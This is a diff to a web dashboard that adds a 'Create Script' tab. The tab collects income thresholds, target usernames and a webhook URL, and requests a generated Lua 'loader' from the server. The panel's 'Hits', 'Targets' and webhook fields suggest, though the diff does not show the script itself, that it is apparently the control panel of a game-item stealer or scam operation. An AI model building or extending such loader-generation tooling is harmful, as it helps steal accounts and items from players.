@@ -61,7 +61,7 @@
             background: #374151;
         }
 
-        input {
+        input, textarea, select {
             background: #1f2937 !important;
             border: 1px solid #374151 !important;
             color: white !important;
@@ -120,6 +120,7 @@
             <button onclick="switchTab('collection')" id="tab-collection" class="tab-btn active px-8 py-4">Collection</button>
             <button onclick="switchTab('bases')" id="tab-bases" class="tab-btn px-8 py-4">Bases</button>
             <button onclick="switchTab('hits')" id="tab-hits" class="tab-btn px-8 py-4">Hits</button>
+            <button onclick="switchTab('create')" id="tab-create" class="tab-btn px-8 py-4 text-green-400"><i class="fa fa-magic mr-2"></i>Create Script</button>
             <button onclick="switchTab('discord')" id="tab-discord" class="tab-btn px-8 py-4 text-purple-400"><i class="fab fa-discord mr-2"></i>Discord</button>
         </nav>
 
@@ -152,6 +153,46 @@
         </section>
 
         <section id="content-hits" class="hidden">
+        </section>
+
+        <section id="content-create" class="hidden mb-6">
+            <div class="data-card p-4">
+                <h2 class="text-sm font-bold mb-3">Create Script Loader</h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
+                    <div>
+                        <label class="text-[11px] text-slate-400">Min Income</label>
+                        <input id="inputMinIncome" type="number" class="w-full p-2 rounded mt-1" value="30000000" />
+                    </div>
+                    <div>
+                        <label class="text-[11px] text-slate-400">Max Items</label>
+                        <input id="inputMaxItems" type="number" class="w-full p-2 rounded mt-1" value="10" />
+                    </div>
+                    <div class="md:col-span-2">
+                        <label class="text-[11px] text-slate-400">Targets (séparés par une virgule)</label>
+                        <input id="inputTargets" type="text" class="w-full p-2 rounded mt-1" value="MagixSafe,M4GIX_TAB01,M4GIX_TAB02,TeCu71710" />
+                    </div>
+                    <div class="md:col-span-2">
+                        <label class="text-[11px] text-slate-400">Fetch URL (optionnel)</label>
+                        <input id="inputWebhook" type="text" class="w-full p-2 rounded mt-1" placeholder="https://... (ex: https://m4gix-ws.onrender.com/TS)" />
+                    </div>
+                    <div class="md:col-span-2">
+                        <label class="text-[11px] text-slate-400">Visual (optionnel)</label>
+                        <input id="inputVisual" type="text" class="w-full p-2 rounded mt-1" placeholder="Image URL ou empty" />
+                    </div>
+                </div>
+
+                <div class="flex gap-2 mt-4">
+                    <button id="btnCreateScript" class="px-4 py-2 bg-green-600 rounded hover:bg-green-500">Create Loader</button>
+                    <button id="btnCopyScript" class="px-4 py-2 bg-slate-700 rounded hover:bg-slate-600">Copy to clipboard</button>
+                </div>
+
+                <div class="mt-4">
+                    <label class="text-[11px] text-slate-400">Generated Script (Lua)</label>
+                    <textarea id="generatedScript" rows="10" class="w-full p-2 rounded mt-1 font-mono text-xs"></textarea>
+                </div>
+
+                <div class="mt-3 text-[11px] text-slate-400">ScriptId généré : <span id="generatedScriptId" class="font-bold text-white"></span></div>
+            </div>
         </section>
 
         <section id="content-discord" class="hidden">
@@ -189,6 +230,7 @@
             if (name === 'collection') loadCollection();
             if (name === 'bases') loadBases();
             if (name === 'hits') loadHits();
+            if (name === 'create') loadCreate();
         }
 
         document.getElementById('refreshBtn').addEventListener('click', () => {
@@ -460,6 +502,58 @@
 
         async function loadHits() {
         }
+
+        function loadCreate() {
+            // reset generated area
+            document.getElementById('generatedScript').value = '';
+            document.getElementById('generatedScriptId').innerText = '';
+        }
+
+        // button handlers -> now call server endpoint /api/create-script
+        document.getElementById('btnCreateScript').addEventListener('click', async () => {
+            const minIncome = document.getElementById('inputMinIncome').value || 0;
+            const maxItems = document.getElementById('inputMaxItems').value || 0;
+            const targets = document.getElementById('inputTargets').value || '';
+            const fetchUrl = document.getElementById('inputWebhook').value || '';
+            const visual = document.getElementById('inputVisual').value || '';
+
+            try {
+                const res = await fetch(`/api/create-script?token=${encodeURIComponent(GLOBAL_TOKEN)}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        minIncome: Number(minIncome),
+                        maxItems: Number(maxItems),
+                        targets: targets,
+                        webhookurl: fetchUrl,
+                        visual: visual
+                    })
+                });
+                const json = await res.json();
+                if (json && json.success && json.data) {
+                    document.getElementById('generatedScript').value = json.data.Script;
+                    document.getElementById('generatedScriptId').innerText = json.data.ScriptId;
+                } else {
+                    alert('Erreur création script.');
+                }
+            } catch (err) {
+                alert('Erreur de connexion au serveur.');
+            }
+        });
+
+        document.getElementById('btnCopyScript').addEventListener('click', async () => {
+            const txt = document.getElementById('generatedScript').value || '';
+            if (!txt) return alert('Aucun script généré.');
+            try {
+                await navigator.clipboard.writeText(txt);
+                const btn = document.getElementById('btnCopyScript');
+                const prev = btn.innerText;
+                btn.innerText = 'Copié !';
+                setTimeout(() => btn.innerText = prev, 1500);
+            } catch {
+                alert('Impossible de copier (clipboard non supporté).');
+            }
+        });
 
         // initial bindings if already authenticated
         if (!document.getElementById('login-overlay').classList.contains('hidden')) {
